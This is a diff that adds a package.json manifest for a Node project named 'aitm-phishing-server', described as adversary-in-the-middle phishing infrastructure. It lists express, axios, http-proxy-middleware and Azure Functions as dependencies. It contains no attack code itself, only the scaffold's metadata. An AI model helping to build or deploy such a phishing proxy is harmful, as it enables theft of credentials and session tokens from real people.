@@ -1,0 +1,20 @@
+{
+  "name": "aitm-phishing-server",
+  "version": "1.0.0",
+  "description": "AiTM Phishing Infrastructure",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "dev": "node index.js",
+    "test": "echo \"No tests yet...\""
+  },
+  "dependencies": {
+    "@azure/functions": "^4.0.0",
+    "axios": "^1.6.8",
+    "express": "^4.21.2",
+    "http-proxy-middleware": "^3.0.5"
+  },
+  "engines": {
+    "node": "22.x"
+  }
+}
